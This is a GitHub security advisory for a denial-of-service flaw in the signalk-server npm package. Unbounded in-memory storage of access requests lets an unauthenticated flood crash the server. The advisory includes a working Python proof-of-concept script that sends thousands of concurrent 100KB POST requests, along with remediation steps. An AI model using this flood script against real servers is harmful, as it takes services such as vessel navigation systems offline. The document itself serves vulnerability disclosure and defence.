# [H] Signal K Server Vulnerable to Denial of Service via Unrestricted Access Request Flooding

## Summary
Severity: High
Advisory: GHSA-7rqc-ff8m-7j23
CVE: CVE-2025-68272
CWE: CWE-400, CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-01-02
Source: https://github.com/advisories/GHSA-7rqc-ff8m-7j23
Type: github-advisory

## Affected
- npm: `signalk-server` — affected >=0 <2.19.0

## Details
### Summary
A Denial of Service (DoS) vulnerability allows an unauthenticated attacker to crash the SignalK Server by flooding the access request endpoint (`/signalk/v1/access/requests`). This causes a "JavaScript heap out of memory" error due to unbounded in-memory storage of request objects.

### Details
The vulnerability is caused by a lack of rate limiting and improper memory management for incoming access requests.

**Vulnerable Code Analysis:**
1.  **In-Memory Storage**: In `src/requestResponse.js`, requests are stored in a simple JavaScript object:
    ```javascript
    const requests = {}
    ```
2.  **Unbounded Growth**: The `createRequest` function adds new requests to this object without checking the current size or count of existing requests.
3.  **Infrequent Pruning**: The `pruneRequests` function, which removes old requests, runs only once every **15 minutes** (`pruneIntervalRate`).
4.  **No Rate Limiting**: The endpoint `/signalk/v1/access/requests` accepts POST requests from any client without any rate limiting or authentication (by design, as it's for initial access requests).

**Exploit Scenario:**
1.  An attacker sends a large number of POST requests (e.g., 20,000+) or requests with large payloads to `/signalk/v1/access/requests`.
2.  The server stores every request in the `requests` object in the Node.js heap.
3.  The heap memory usage spikes rapidly.
4.  The Node.js process hits its memory limit (default ~1.5GB) and crashes with `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`.

### PoC
The following Python script reproduces the crash by flooding the server with requests containing 100KB payloads.

```python
import urllib.request
import json
import threading
import time

# Target Configuration
TARGET_URL = "http://localhost:3000/signalk/v1/access/requests"
PAYLOAD_SIZE_MB = 0.1  # 100 KB per request
NUM_REQUESTS = 20000   # Sufficient to exhaust heap
CONCURRENCY = 50

# Generate a large string payload
LARGE_STRING = "A" * (int(PAYLOAD_SIZE_MB * 1024 * 1024))

def send_heavy_request(i):
    try:
        payload = {
            "clientId": f"attacker-device-{i}",
            "description": LARGE_STRING, # Stored in memory!
            "permissions": "readwrite"
        }
        data = json.dumps(payload).encode('utf-8')
        
        req = urllib.request.Request(
            TARGET_URL, 
            data=data, 
            headers={'Content-Type': 'application/json'}, 
            method='POST'
        )
        # Short timeout as server might hang
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

def attack():
    print(f"[*] Starting DoS Attack on {TARGET_URL}...")
    threads = []
    for i in range(NUM_REQUESTS):
        t = threading.Thread(target=send_heavy_request, args=(i,))
        threads.append(t)
        t.start()
        
        if len(threads) >= CONCURRENCY:
            for t in threads: t.join()
            threads = []

if __name__ == "__main__":
    attack()
```

**Expected Result:**
Monitor the server process. Memory usage will increase rapidly, and the server will eventually terminate with an Out of Memory (OOM) error.

### Impact
**Verified Denial of Service**:
During our verification using the provided PoC, we observed the following:
1.  **Rapid Memory Exhaustion**: The Node.js process memory usage increased by approximately **30MB within seconds** of starting the attack.
2.  **Service Instability**: Continued execution of the PoC quickly leads to a `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory` crash.
3.  **Service Unavailability**: The server becomes completely unresponsive and terminates, requiring a manual restart to recover. This allows an unauthenticated attacker to easily take the vessel's navigation data server offline.

---
### Remediation
**1. Implement Rate Limiting**
Use a middleware like `express-rate-limit` to restrict the number of requests from a single IP address to `/signalk/v1/access/requests`.

**2. Limit Request Storage**
Modify `src/requestResponse.js` to enforce a maximum number of stored requests (e.g., 100). If the limit is reached, reject new requests or evict the oldest ones immediately.

**3. Validate Payload Size**
Enforce strict limits on the size of the `description` and other fields in the access request payload.

## References
- https://github.com/SignalK/signalk-server/security/advisories/GHSA-7rqc-ff8m-7j23
- https://nvd.nist.gov/vuln/detail/CVE-2025-68272
- https://github.com/SignalK/signalk-server/commit/55e3574d8266fbc0ed8e453ad4557073541566f5
- https://github.com/SignalK/signalk-server
- https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
